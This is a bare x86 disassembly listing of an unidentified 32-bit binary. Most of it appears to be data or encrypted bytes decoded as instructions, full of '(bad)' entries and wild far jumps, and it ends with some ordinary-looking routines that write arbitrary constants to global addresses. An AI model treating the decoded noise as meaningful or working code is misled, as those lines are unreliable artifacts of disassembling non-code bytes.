  410e83:	xchg   ebp,eax
  410e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e85:	dec    edi
  410e86:	jp     0xf8964224
  410e8c:	mov    edi,0x4eb1bde9
  410e91:	push   esi
  410e92:	cwde   
  410e93:	jmp    0x7f59:0x4b42df6b
  410e9a:	outs   dx,BYTE PTR ds:[esi]
  410e9b:	jecxz  0x410f11
  410e9d:	aam    0x43
  410e9f:	imul   edi,DWORD PTR [edi-0x19286049],0x73
  410ea6:	call   0xd0a2:0x4faeefb8
  410ead:	add    eax,0xb4c295d4
  410eb2:	jle    0x410ee8
  410eb4:	jb     0x410f2d
  410eb6:	pop    es
  410eb7:	mov    ah,dh
  410eb9:	adc    eax,0xd3c10677
  410ebe:	ret    0x617d
  410ec1:	mov    DWORD PTR [edi],edi
  410ec3:	sbb    bh,ch
  410ec5:	popf   
  410ec6:	ror    esp,1
  410ec8:	push   0x3c
  410eca:	mov    ch,0xc
  410ecc:	dec    esi
  410ecd:	(bad)  
  410ece:	sub    eax,0x42077293
  410ed3:	xchg   ebp,eax
  410ed4:	inc    edx
  410ed5:	in     al,0xd8
  410ed7:	jbe    0x410e96
  410ed9:	data16 sub ch,bh
  410edc:	jno    0x410ecf
  410ede:	jecxz  0x410eaa
  410ee0:	cdq    
  410ee1:	dec    esp
  410ee2:	dec    ebx
  410ee3:	xchg   edx,eax
  410ee4:	and    eax,0x997945a8
  410ee9:	gs cld 
  410eeb:	test   al,0xf1
  410eed:	cmp    eax,0x332958d3
  410ef2:	std    
  410ef3:	sub    al,0x1
  410ef5:	and    bl,dl
  410ef7:	pusha  
  410ef8:	fistp  QWORD PTR [ebp-0x1e51494f]
  410efe:	or     BYTE PTR [ecx-0x51],dl
  410f01:	xor    ecx,DWORD PTR [ecx+edx*2]
  410f04:	cdq    
  410f05:	and    al,0x65
  410f07:	rcl    BYTE PTR [eax-0x63],0x36
  410f0b:	pop    esp
  410f0c:	cmp    al,0x55
  410f0e:	jecxz  0x410eae
  410f10:	cwde   
  410f11:	cmp    eax,0x6de4a496
  410f16:	not    BYTE PTR [ebx+0x42]
  410f19:	pop    ebx
  410f1a:	xchg   DWORD PTR [edi-0x56],esp
  410f1d:	dec    esi
  410f1e:	pop    ebx
  410f1f:	mov    esi,DWORD PTR [ebx-0x48f52b5]
  410f25:	(bad)  
  410f29:	sub    edi,DWORD PTR [eax+0x7cfbd188]
  410f2f:	inc    ecx
  410f30:	popa   
  410f31:	sbb    BYTE PTR [eax-0x69874276],0x66
  410f38:	es mov dh,0x2c
  410f3b:	add    BYTE PTR [esi+eax*2-0x1],bl
  410f3f:	adc    ebp,DWORD PTR [ebx+0x3e2e459c]
  410f45:	ret    0x4d74
  410f48:	or     al,0xc3
  410f4a:	mov    ds:0x6a6224d5,al
  410f4f:	outs   dx,BYTE PTR ds:[esi]
  410f50:	ss mov ecx,0xea983c0b
  410f56:	cwde   
  410f57:	push   edx
  410f58:	jmp    0xb016:0x591aa3e2
  410f5f:	xchg   edi,eax
  410f60:	shl    BYTE PTR [esi+0x76],0xb4
  410f64:	sub    al,0x95
  410f66:	outs   dx,BYTE PTR ds:[esi]
  410f67:	or     edx,DWORD PTR [ebp+0x55]
  410f6a:	loope  0x410f4d
  410f6c:	std    
  410f6d:	lods   eax,DWORD PTR ds:[esi]
  410f6e:	(bad)  [ebx-0x26]
  410f71:	lods   eax,DWORD PTR ds:[esi]
  410f73:	cli    
  410f74:	popf   
  410f75:	push   esp
  410f76:	push   edi
  410f77:	add    BYTE PTR [esi+0x44],bh
  410f7a:	mov    edx,ds
  410f7c:	mov    ah,0xe3
  410f7e:	int    0x96
  410f80:	test   al,0xa0
  410f82:	mov    ds:0x2d0efb90,al
  410f87:	sar    BYTE PTR [eax-0x506c450e],1
  410f8d:	sub    BYTE PTR [edi],cl
  410f8f:	and    cl,ch
  410f91:	stos   DWORD PTR es:[edi],eax
  410f92:	inc    edx
  410f93:	push   ecx
  410f94:	je     0x410f3e
  410f96:	mov    esi,0xd1333849
  410f9b:	inc    ebx
  410f9c:	adc    DWORD PTR [edi+0x67b1b6d9],edx
  410fa2:	nop
  410fa3:	std    
  410fa4:	adc    dh,BYTE PTR ds:0xa60b69fb
  410faa:	or     bl,dl
  410fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fad:	retf   0xcfb9
  410fb0:	push   esp
  410fb1:	ins    DWORD PTR es:[edi],dx
  410fb2:	adc    eax,0x42733a4a
  410fb7:	mov    ecx,0x71a4aeb8
  410fbc:	xor    edx,eax
  410fbe:	js     0x410f50
  410fc0:	and    al,0x3b
  410fc2:	xor    al,ah
  410fc4:	mov    bl,0xdf
  410fc6:	mov    BYTE PTR [ebp-0x51],bl
  410fc9:	and    ebp,ebx
  410fcb:	sbb    BYTE PTR [esi+eax*8+0x6],bl
  410fcf:	and    al,0x4
  410fd1:	fmul   QWORD PTR [ebp+edi*4-0x5fdb2c6a]
  410fd8:	jo     0x410f7d
  410fda:	and    eax,0xc8629d5f
  410fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fe0:	pop    ds
  410fe1:	fsubr  QWORD PTR [ecx]
  410fe3:	popa   
  410fe4:	lods   eax,DWORD PTR ds:[esi]
  410fe5:	ret    
  410fe6:	push   0x65
  410fe8:	sti    
  410fe9:	in     al,dx
  410fea:	cld    
  410feb:	loope  0x411038
  410fed:	daa    
  410fee:	mov    bl,0x39
  410ff0:	dec    ebp
  410ff1:	sbb    eax,0x87f68990
  410ff6:	out    0xb9,al
  410ff8:	push   ebx
  410ff9:	aad    0x52
  410ffb:	fcomp  st(4)
  410ffd:	mov    ebx,0x659fcae2
  411002:	frstor [ecx]
  411004:	outs   dx,DWORD PTR ds:[esi]
  411005:	sub    ch,bl
  411007:	push   es
  411008:	gs pop edx
  41100a:	inc    edx
  41100b:	mov    cl,dl
  41100d:	dec    eax
  41100e:	inc    esp
  41100f:	mov    eax,esi
  411011:	ffreep st(1)
  411013:	jae    0x411093
  411015:	mov    edi,0xea699dbe
  41101a:	mov    eax,0x3b921e63
  41101f:	or     bl,0x6b
  411022:	sub    BYTE PTR [eax],cl
  411024:	mov    bl,0x4e
  411026:	bound  edi,QWORD PTR [ebx]
  411028:	daa    
  411029:	mov    dl,BYTE PTR [edi]
  41102b:	out    dx,al
  41102c:	in     eax,0x7e
  41102e:	jge    0x41107d
  411030:	jb     0x4110a0
  411032:	add    eax,0xaa29ff10
  411037:	retf   0x2e97
  41103a:	push   0xfffffff3
  41103c:	cmp    al,0x70
  41103e:	adc    DWORD PTR [esp+eiz*8],0x471fceb0
  411045:	add    al,0x33
  411047:	test   al,0x11
  411049:	enter  0x5be4,0xd3
  41104d:	push   edi
  41104e:	fdivr  st(5),st
  411050:	imul   BYTE PTR [edx]
  411052:	pop    esi
  411053:	jne    0x411016
  411055:	xor    ah,0xdb
  411058:	dec    edx
  411059:	pop    eax
  41105a:	call   DWORD PTR [edx-0x668ba11c]
  411060:	mov    bh,0xf5
  411062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411063:	loopne 0x410fe5
  411065:	test   al,0x9d
  411067:	in     al,dx
  411068:	(bad)  
  411069:	sub    bh,ah
  41106b:	fs jb  0x411060
  41106e:	xchg   ebx,eax
  41106f:	cwde   
  411070:	mov    ds:0xc0c98da6,eax
  411075:	aam    0xb3
  411077:	cmp    esp,DWORD PTR [edi+0xa2e5f27]
  41107d:	icebp  
  41107e:	mov    edx,0x23d7d22d
  411083:	ins    BYTE PTR es:[edi],dx
  411084:	lahf   
  411085:	mov    esp,cs
  411087:	sbb    DWORD PTR [edi+0x5b73fd69],0x3a9a017c
  411091:	ss jmp esp
  411094:	mov    bh,0xa6
  411096:	xchg   edx,eax
  411097:	test   esp,0x902ee31a
  41109d:	bound  edi,QWORD PTR [eax-0x1a]
  4110a0:	mov    BYTE PTR [ebx+edx*4],al
  4110a3:	cld    
  4110a4:	jmp    0x4110df
  4110a6:	xor    ecx,ecx
  4110a8:	pop    ss
  4110a9:	stos   DWORD PTR es:[edi],eax
  4110aa:	pop    ecx
  4110ab:	sub    eax,edi
  4110ad:	fs xor eax,0xe0fd5972
  4110b3:	pop    ss
  4110b4:	adc    DWORD PTR [eax+0x51cc07af],eax
  4110ba:	dec    eax
  4110bb:	jb     0x41107e
  4110bd:	pop    edx
  4110be:	push   edx
  4110bf:	ins    DWORD PTR es:[edi],dx
  4110c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c1:	inc    esp
  4110c2:	das    
  4110c3:	push   ecx
  4110c4:	and    al,bh
  4110c6:	add    ch,BYTE PTR ds:0x526059e2
  4110cc:	cmp    al,0xb8
  4110ce:	jno    0x41111d
  4110d0:	inc    ebp
  4110d1:	push   edi
  4110d2:	(bad)  
  4110d3:	push   0xffffffb5
  4110d5:	dec    esi
  4110d6:	mov    ch,0x36
  4110d8:	cdq    
  4110d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110da:	out    0xeb,al
  4110dc:	fwait
  4110dd:	repz sbb DWORD PTR [esi+ebp*2],edx
  4110e1:	pop    ds
  4110e2:	das    
  4110e3:	or     bl,BYTE PTR [ecx+0x5b25fea7]
  4110e9:	and    ch,cl
  4110eb:	into   
  4110ec:	neg    BYTE PTR [esi+0x3411b387]
  4110f2:	dec    esi
  4110f3:	cdq    
  4110f4:	inc    ecx
  4110f5:	sub    ebx,DWORD PTR [edx-0x15069703]
  4110fb:	stos   BYTE PTR es:[edi],al
  4110fc:	cs out 0x95,al
  4110ff:	out    dx,al
  411100:	lock xchg ebx,eax
  411102:	xor    DWORD PTR [edx+0x51a52da6],ebp
  411108:	jecxz  0x41115a
  41110a:	xchg   ebx,eax
  41110b:	or     al,0xcf
  41110d:	pop    ss
  41110e:	aam    0xc2
  411110:	loopne 0x411109
  411112:	subps  xmm4,XMMWORD PTR [ebx+ebx*4]
  411116:	rol    bh,0x1b
  411119:	ins    BYTE PTR es:[edi],dx
  41111a:	out    dx,al
  41111b:	pop    ebx
  41111c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41111d:	shr    BYTE PTR [ebp+0x7],1
  411120:	dec    ebp
  411121:	shl    BYTE PTR [ebx],1
  411123:	pop    esp
  411124:	sub    BYTE PTR ds:0xf6c09a8d,dl
  41112a:	outs   dx,BYTE PTR ds:[esi]
  41112b:	inc    ecx
  41112c:	out    0xed,al
  41112e:	mov    bl,0x64
  411130:	pushf  
  411131:	adc    eax,0x430ec502
  411136:	inc    edi
  411137:	lock shl BYTE PTR es:[eax+edi*4],0x8c
  41113d:	push   0xffffffe6
  41113f:	or     al,0x3f
  411141:	je     0x411111
  411143:	jo     0x41111c
  411145:	mov    ebp,0x39e47ff
  41114a:	and    DWORD PTR [ebp+0x4e],ebp
  41114d:	(bad)  
  41114f:	or     BYTE PTR [edx-0x6389f4e8],dl
  411155:	xor    BYTE PTR [esi-0x1017b282],ah
  41115b:	xchg   edx,eax
  41115c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41115d:	push   esp
  41115e:	scas   al,BYTE PTR es:[edi]
  41115f:	dec    eax
  411160:	popf   
  411161:	shr    al,0xcd
  411164:	nop
  411165:	cld    
  411166:	jp     0x4111e6
  411168:	push   ebx
  411169:	aad    0xb1
  41116b:	adc    eax,0x66649f94
  411170:	lods   eax,DWORD PTR ds:[esi]
  411171:	hlt    
  411172:	xchg   BYTE PTR ds:0x6d3de08c,cl
  411178:	rol    DWORD PTR [edi+ebp*4+0x16ad544f],cl
  41117f:	inc    ecx
  411180:	add    DWORD PTR [ebx-0x4270c477],esi
  411186:	mov    dl,0xf3
  411188:	repz pop esi
  41118a:	int3   
  41118b:	ins    DWORD PTR es:[edi],dx
  41118c:	cmp    esi,0x3e
  41118f:	pop    edi
  411190:	lods   eax,DWORD PTR ds:[esi]
  411191:	pop    eax
  411192:	fbstp  TBYTE PTR [edi+0x5]
  411195:	hlt    
  411196:	hlt    
  411197:	mov    ah,al
  411199:	stos   DWORD PTR es:[edi],eax
  41119a:	xlat   BYTE PTR ds:[ebx]
  41119b:	dec    ecx
  41119c:	mov    ds:0x2bef642c,eax
  4111a1:	mov    ebx,0xac57f9fb
  4111a6:	aad    0x71
  4111a8:	pop    es
  4111a9:	div    cl
  4111ab:	adc    al,0xbf
  4111ad:	jne    0x4111b0
  4111af:	neg    DWORD PTR [ebp+0x2c4bb9d6]
  4111b5:	sub    eax,0x20797908
  4111ba:	sti    
  4111bb:	popf   
  4111bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111bd:	std    
  4111be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111bf:	retf   0xa8ca
  4111c2:	inc    esi
  4111c3:	in     al,dx
  4111c4:	inc    edx
  4111c5:	test   BYTE PTR [edx],0x4c
  4111c8:	xor    cl,BYTE PTR [eax-0x23]
  4111cb:	inc    edi
  4111cc:	in     al,0x45
  4111ce:	jmp    0x4111dd
  4111d0:	and    DWORD PTR [esi+ecx*4-0x921e7d8],eax
  4111d7:	sbb    DWORD PTR [ebp-0x78],esp
  4111da:	jmp    0x65a5123
  4111df:	mov    ah,0xb0
  4111e1:	loopne 0x41122d
  4111e3:	lock (bad) 
  4111e5:	mov    ch,0x80
  4111e7:	dec    esi
  4111e8:	pop    esi
  4111e9:	(bad)  
  4111ea:	push   ebx
  4111eb:	pusha  
  4111ec:	outs   dx,BYTE PTR ds:[esi]
  4111ed:	mov    esp,0x6a266eaf
  4111f2:	push   0x473db106
  4111f7:	cmp    al,0x89
  4111f9:	ss arpl dx,cx
  4111fc:	iret   
  4111fd:	sub    BYTE PTR ds:0xd2d3297d,0x10
  411204:	xchg   ebx,eax
  411205:	push   ebp
  411206:	loopne 0x41119f
  411208:	sub    ecx,DWORD PTR cs:[edx+eiz*8]
  41120c:	ret    
  41120d:	std    
  41120e:	inc    ebx
  41120f:	retf   0x48b8
  411212:	mov    ch,0x32
  411214:	jge    0x411226
  411216:	adc    edx,DWORD PTR [edx]
  411218:	enter  0x80f5,0x31
  41121c:	jmp    0x4111bc
  41121e:	test   al,0x18
  411220:	cli    
  411221:	in     al,0x36
  411223:	push   edx
  411224:	test   DWORD PTR [ebp+ebx*4+0x1d877038],esp
  41122b:	out    dx,eax
  41122c:	not    BYTE PTR [eax+0x36c4142a]
  411232:	mov    edx,0xfccfa0df
  411237:	or     eax,0x6a52f556
  41123c:	pop    edi
  41123d:	jp     0x4111e5
  41123f:	pop    eax
  411240:	test   DWORD PTR [ecx],0x7e8b3652
  411246:	das    
  411247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411248:	stos   DWORD PTR es:[edi],eax
  411249:	inc    eax
  41124a:	mov    eax,0x9e23f97b
  41124f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411250:	inc    esi
  411251:	adc    bl,BYTE PTR [esp+eax*8+0x14d11ab0]
  411258:	popf   
  411259:	adc    eax,0xabddc744
  41125e:	xchg   ebp,esi
  411260:	pop    eax
  411261:	jae    0x411233
  411263:	(bad)  
  411264:	add    ecx,ebp
  411266:	cmc    
  411267:	push   ds
  411268:	xor    al,BYTE PTR [eax-0x3a]
  41126b:	mov    dl,0x59
  41126e:	jns    0x4112bb
  411270:	in     eax,0xe
  411272:	sub    esp,ebx
  411274:	mov    eax,0xf435dfe
  411279:	xchg   ebp,eax
  41127a:	xchg   edx,eax
  41127b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41127c:	dec    ecx
  41127d:	mov    esp,0xf6f92b35
  411282:	ja     0x411206
  411284:	cmp    eax,0x8b7f74f1
  411289:	mov    esp,0x34c40db4
  41128e:	and    BYTE PTR [edx-0x246470d5],al
  411294:	xchg   ebp,eax
  411295:	pop    esp
  411296:	sub    ch,BYTE PTR [ecx+0x4f]
  411299:	shl    BYTE PTR [eax-0x136af91d],cl
  41129f:	and    BYTE PTR [ebx+0x3e],bl
  4112a2:	or     al,0xdc
  4112a4:	ss in  al,dx
  4112a6:	mov    esp,0xa77c182c
  4112ab:	int    0xad
  4112ad:	ja     0x411285
  4112af:	inc    ebp
  4112b0:	and    BYTE PTR [esi+0x38bb025a],0xf7
  4112b7:	cmp    ah,BYTE PTR [esi]
  4112b9:	fsub   st,st(0)
  4112bb:	stos   BYTE PTR es:[edi],al
  4112bc:	mov    ds:0xdfca283f,eax
  4112c1:	shl    DWORD PTR [ebx],0xb9
  4112c4:	(bad)
  4112c7:	ins    BYTE PTR es:[edi],dx
  4112c8:	cmp    ch,BYTE PTR ds:0xa75dc6c6
  4112ce:	leave  
  4112cf:	pop    ebp
  4112d0:	xor    al,0x40
  4112d2:	add    bl,bh
  4112d4:	jne    0x411277
  4112d6:	ror    DWORD PTR [ebx],0x1b
  4112d9:	lea    ebx,[ebp+0x5308cccb]
  4112df:	mov    esi,0xe21375f4
  4112e4:	jbe    0x411291
  4112e6:	fxch   st(6)
  4112e8:	clc    
  4112e9:	es aaa 
  4112eb:	stos   BYTE PTR es:[edi],al
  4112ec:	xchg   edi,eax
  4112ed:	stos   DWORD PTR es:[edi],eax
  4112ee:	cmp    DWORD PTR [edx+0x14e99fc8],ebx
  4112f4:	xchg   DWORD PTR [edx+0x6eb27a5d],esp
  4112fa:	fcomp  DWORD PTR [ebx-0x43636847]
  411300:	aaa    
  411301:	daa    
  411302:	ins    DWORD PTR es:[edi],dx
  411303:	mov    ebx,0x16763c74
  411308:	out    dx,eax
  411309:	mov    al,ds:0xda96d556
  41130e:	mov    dl,0xd
  411310:	shl    BYTE PTR [edi-0x43af22aa],0x52
  411317:	adc    bh,ch
  411319:	add    eax,0x90a0dc14
  41131e:	aam    0x26
  411320:	xchg   edx,eax
  411321:	and    BYTE PTR [eax],cl
  411323:	jg     0x4112ee
  411325:	sub    ah,BYTE PTR [ebp+0x5bad80a4]
  41132b:	jae    0x4112d0
  41132d:	out    0xc5,al
  41132f:	mov    BYTE PTR [ecx+0x6b6b6414],al
  411335:	mov    ah,0x43
  411337:	add    eax,0xb9042cd
  41133c:	daa    
  41133d:	sbb    al,0x4a
  41133f:	call   0x8a1dd14e
  411344:	jo     0x41137a
  411346:	ja     0x411350
  411348:	cmc    
  411349:	sbb    al,0x69
  41134b:	sti    
  41134c:	sub    BYTE PTR [esi-0x23],bh
  41134f:	aaa    
  411350:	(bad)  
  411351:	cli    
  411352:	pop    ss
  411353:	lds    ecx,FWORD PTR [eax+0x5e1b2160]
  411359:	mov    cl,0xd2
  41135b:	xchg   esp,eax
  41135c:	xor    al,0x2b
  41135e:	push   cs
  41135f:	sub    eax,0x8e079c24
  411364:	jbe    0x411355
  411366:	(bad)  
  411367:	aad    0xff
  411369:	mov    dh,0x51
  41136b:	xchg   BYTE PTR [ecx],ch
  41136d:	sbb    al,0xa5
  41136f:	enter  0x12e5,0xf
  411373:	pop    esi
  411374:	pop    es
  411375:	cmp    ah,dh
  411377:	jg     0x411372
  411379:	retf   
  41137a:	add    al,0xfd
  41137c:	mov    bl,0x79
  41137e:	mov    esp,0x99989255
  411383:	repnz push es
  411385:	mov    al,0x6d
  411387:	dec    eax
  411388:	inc    ebx
  411389:	retf   0x3533
  41138c:	hlt    
  41138d:	pushf  
  41138e:	scas   eax,DWORD PTR es:[edi]
  41138f:	imul   esi,DWORD PTR [esi+0x1622e685],0xfa25082d
  411399:	pop    esp
  41139a:	inc    ebp
  41139b:	cmp    DWORD PTR [edi+0x583ed0c9],ecx
  4113a1:	pavgw  mm3,QWORD PTR [edi-0x6bd9047c]
  4113a8:	push   ebp
  4113a9:	sbb    edx,DWORD PTR [ecx-0x9]
  4113ac:	fcmove st,st(3)
  4113ae:	cs inc edi
  4113b0:	cmp    BYTE PTR [ebp+esi*4-0xaeeb25a],dh
  4113b7:	mov    edx,0x643bae59
  4113bc:	leave  
  4113bd:	dec    edx
  4113be:	add    al,0xcd
  4113c0:	push   cs
  4113c1:	sti    
  4113c2:	mov    esi,0x5fe060b0
  4113c7:	xor    DWORD PTR [eax-0x7],ebx
  4113ca:	shr    bl,1
  4113cc:	push   edx
  4113cd:	bound  ebx,QWORD PTR [edx-0x34efd6b0]
  4113d3:	sub    DWORD PTR [ecx-0x461cc320],esi
  4113d9:	(bad)  
  4113da:	add    esp,DWORD PTR gs:[ebx-0x29b44be6]
  4113e1:	repz cmp eax,0x892283
  4113e7:	cmp    bh,al
  4113e9:	cld    
  4113ea:	ss cs (bad) 
  4113ed:	mov    bh,0x41
  4113ef:	push   ds
  4113f0:	mov    eax,0xf87b96f4
  4113f5:	xchg   BYTE PTR [edx+0x25],cl
  4113f8:	lods   eax,DWORD PTR ds:[esi]
  4113f9:	xchg   esp,eax
  4113fa:	leave  
  4113fb:	jbe    0x41144e
  4113fd:	pusha  
  4113fe:	pop    edi
  4113ff:	scas   al,BYTE PTR es:[edi]
  411400:	shr    BYTE PTR [ebp-0x18],cl
  411403:	shl    BYTE PTR [eax+edx*4+0x581a3781],cl
  41140a:	pcmpeqb mm4,mm2
  41140d:	push   ebx
  41140e:	hlt    
  41140f:	retf   0xd36f
  411412:	jmp    0xfd24042c
  411417:	in     al,0xbd
  411419:	mov    ah,0x23
  41141b:	adc    eax,0x2bc2a85e
  411420:	nop
  411421:	mov    ah,0x29
  411423:	add    dh,BYTE PTR [esi+edi*8+0x61]
  411427:	call   FWORD PTR [ebp-0x23697f7b]
  41142d:	mov    ?,eax
  41142f:	push   ebp
  411430:	hlt    
  411431:	mov    eax,0x6930c35b
  411436:	mov    ecx,esp
  411438:	popf   
  411439:	push   es
  41143a:	aam    0xbb
  41143c:	mov    ebx,edx
  41143e:	int3   
  41143f:	and    DWORD PTR [edx-0x37],eax
  411442:	fs mov eax,0x99ce6459
  411448:	into   
  411449:	daa    
  41144a:	cld    
  41144b:	sub    eax,0x89441886
  411450:	data16 stc 
  411452:	inc    ebp
  411453:	mov    ah,0x90
  411455:	in     eax,0xe5
  411457:	mov    ecx,0x83deac4f
  41145c:	(bad)  [edx+0x7a]
  41145f:	clts   
  411461:	fcomp  DWORD PTR [edi+0x53f02d43]
  411467:	out    dx,al
  411468:	dec    ebx
  411469:	push   esi
  41146a:	pop    esp
  41146b:	adc    DWORD PTR [ebx],ebp
  41146d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146e:	loop   0x4114be
  411470:	sub    BYTE PTR [ebx+ebp*2+0x56f2db41],cl
  411477:	inc    ebp
  411478:	mov    DWORD PTR [edx-0x74],ecx
  41147b:	aas    
  41147c:	pop    es
  41147d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41147e:	cvtps2pd xmm5,QWORD PTR [ebx+0x744d874a]
  411485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411486:	fstp   TBYTE PTR [ecx+0x62]
  411489:	inc    eax
  41148a:	sti    
  41148b:	ds fwait
  41148d:	jbe    0x41150b
  41148f:	fcmovnbe st,st(7)
  411491:	es or  eax,0xbc550150
  411497:	shl    DWORD PTR [eax-0x186ad4df],cl
  41149d:	lds    ecx,FWORD PTR [ebp-0x587c5ff4]
  4114a3:	add    eax,0x1e9834a9
  4114a8:	retf   0xda96
  4114ab:	rcr    edx,cl
  4114ad:	add    esp,ebp
  4114af:	test   al,0x11
  4114b1:	mov    ebx,0x9f409d54
  4114b6:	cmp    al,0x77
  4114b8:	clc    
  4114b9:	outs   dx,BYTE PTR ds:[esi]
  4114ba:	mov    al,ds:0x64d25eab
  4114bf:	mov    ds:0x152d20be,al
  4114c4:	cs scas al,BYTE PTR es:[edi]
  4114c6:	jg     0x4114ee
  4114c8:	pop    ebp
  4114c9:	push   0x52
  4114cb:	loope  0x411467
  4114cd:	push   ds
  4114ce:	fdiv   DWORD PTR [ecx]
  4114d0:	inc    ebx
  4114d1:	sbb    ecx,DWORD PTR [ebx+0x2b]
  4114d4:	scas   al,BYTE PTR es:[edi]
  4114d5:	pop    es
  4114d6:	aad    0x3b
  4114d8:	or     edi,DWORD PTR [eax]
  4114da:	retf   0x27b6
  4114dd:	clc    
  4114de:	push   ebx
  4114df:	cld    
  4114e0:	das    
  4114e1:	fs in  eax,0x21
  4114e4:	loope  0x411490
  4114e6:	test   BYTE PTR [edx+0x5d],dh
  4114e9:	xchg   edi,eax
  4114ea:	fadd   QWORD PTR ds:0xd6d13463
  4114f0:	cli    
  4114f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f2:	loop   0x411553
  4114f4:	sub    ah,bh
  4114f6:	dec    edi
  4114f7:	retf   0x7e34
  4114fa:	sahf   
  4114fb:	popf   
  4114fc:	mov    ah,0x7c
  4114fe:	mov    bl,BYTE PTR [edx+0x688084be]
  411504:	and    DWORD PTR [edx*8-0x18ab742d],eax
  41150b:	bndstx [esi-0x4677684d],(bad)
  411512:	mov    dh,0x83
  411514:	dec    edi
  411515:	clc    
  411516:	inc    ecx
  411517:	push   ebp
  411518:	shr    DWORD PTR [edi+0x62],cl
  41151b:	jmp    0x411516
  41151d:	rol    ebx,cl
  41151f:	inc    ecx
  411520:	sub    eax,0xd86f4e4c
  411525:	ss push ebx
  411527:	nop
  411528:	jbe    0x411564
  41152a:	xor    bh,BYTE PTR [ebx]
  41152c:	inc    eax
  41152d:	popf   
  41152e:	add    BYTE PTR [edi-0x5c],0x61
  411532:	ror    DWORD PTR [edi+eiz*8-0x30d24c97],0x8a
  41153a:	(bad)  
  41153b:	loopne 0x41159c
  41153d:	push   0x32a15765
  411542:	out    0x37,eax
  411544:	jg     0x411593
  411546:	jbe    0x411513
  411548:	sbb    DWORD PTR [ebx],0xffffffaf
  41154b:	adc    BYTE PTR [ebp+0x16101c30],0xba
  411552:	xor    ebp,DWORD PTR [edi]
  411554:	aas    
  411555:	dec    eax
  411556:	daa    
  411557:	hlt    
  411558:	fisub  WORD PTR [ebx]
  41155a:	jo     0x411501
  41155c:	retf   
  41155d:	test   al,0x5a
  41155f:	pop    esp
  411560:	dec    esp
  411561:	outs   dx,DWORD PTR ds:[esi]
  411562:	jecxz  0x41155a
  411564:	push   esi
  411565:	dec    esp
  411566:	fsubr  DWORD PTR [ebx-0x757612b4]
  41156c:	and    DWORD PTR ds:0xe7201cfd,edi
  411572:	test   eax,0xb0ae5601
  411577:	mov    esi,0x9cae86be
  41157c:	xchg   ebp,eax
  41157d:	sbb    esp,DWORD PTR [edx-0x18]
  411580:	mov    cl,0x1a
  411582:	push   0x458bd71c
  411587:	cld    
  411588:	xor    eax,ecx
  41158a:	mov    ecx,DWORD PTR [ebp+0xc]
  41158d:	add    eax,edx
  41158f:	imul   eax,ecx
  411592:	add    eax,DWORD PTR [ebp+0x8]
  411595:	mov    DWORD PTR [ebp+0xc],eax
  411598:	mov    eax,DWORD PTR [ebp+0xc]
  41159b:	jmp    0x4115b1
  4115a0:	mov    eax,DWORD PTR [ebp-0x4]
  4115a3:	mov    esi,DWORD PTR [ebp-0x8]
  4115a6:	xor    esi,ecx
  4115a8:	xor    eax,ecx
  4115aa:	add    esi,edx
  4115ac:	add    eax,edx
  4115ae:	imul   eax,esi
  4115b1:	pop    edi
  4115b2:	pop    esi
  4115b3:	leave  
  4115b4:	ret    0x8
  4115b7:	push   ebp
  4115b8:	mov    ebp,esp
  4115ba:	push   ecx
  4115bb:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  4115c2:	xor    DWORD PTR ds:0x42c000,0x5835
  4115cc:	mov    eax,DWORD PTR [ebp-0x4]
  4115cf:	mov    edx,DWORD PTR [ebp+0x10]
  4115d2:	adc    DWORD PTR ds:0x42c018,0x22a2
  4115dc:	mov    ecx,0x7510899
  4115e1:	xor    eax,ecx
  4115e3:	sbb    DWORD PTR ds:0x42a014,0x72a0
  4115ed:	add    eax,0x3272e0
  4115f2:	or     DWORD PTR ds:0x42d000,0x42a000
  4115fc:	mov    DWORD PTR [edx],eax
  4115fe:	and    DWORD PTR ds:0x42b014,0x0
  411608:	jmp    0x411618
  41160d:	mov    eax,ds:0x42b014
  411612:	inc    eax
  411613:	mov    ds:0x42b014,eax
  411618:	cmp    DWORD PTR ds:0x42b014,0x1d
  41161f:	jae    0x411664
  411625:	cmp    DWORD PTR ds:0x42b014,0x9
  41162c:	jne    0x41163d
  411632:	push   0x429004
  411637:	call   DWORD PTR ds:0x42ecb3
  41163d:	cmp    DWORD PTR ds:0x42b014,0x8
  411644:	jne    0x411655
  41164a:	mov    eax,ds:0x42b014
  41164f:	inc    eax
  411650:	mov    ds:0x42b014,eax
  411655:	jmp    0x41160d
  41165a:	and    DWORD PTR ds:0x42c01c,0x369c
  411664:	mov    eax,DWORD PTR [ebp+0xc]
  411667:	xor    eax,ecx
  411669:	push   esi
  41166a:	mov    esi,DWORD PTR [ebp+0x10]
  41166d:	mov    edx,0x3272e0
  411672:	add    eax,edx
  411674:	mov    DWORD PTR [esi+0x4],eax
  411677:	mov    eax,DWORD PTR [ebp+0x14]
  41167a:	mov    esi,DWORD PTR [ebp+0x10]
  41167d:	mov    DWORD PTR [esi+0x8],eax
  411680:	mov    eax,DWORD PTR [ebp+0x18]
  411683:	mov    esi,DWORD PTR [ebp+0x10]
  411686:	mov    DWORD PTR [esi+0xc],eax
  411689:	mov    eax,DWORD PTR [ebp+0x1c]
  41168c:	mov    esi,DWORD PTR [ebp+0x10]
  41168f:	mov    DWORD PTR [esi+0x10],eax
  411692:	mov    eax,DWORD PTR [ebp+0x8]
  411695:	xor    eax,ecx
  411697:	add    eax,edx
  411699:	pop    esi
  41169a:	leave  
  41169b:	ret    0x18
  41169e:	push   ebp
  41169f:	mov    ebp,esp
  4116a1:	sub    esp,0x9c
  4116a7:	add    eax,DWORD PTR ds:0x429004
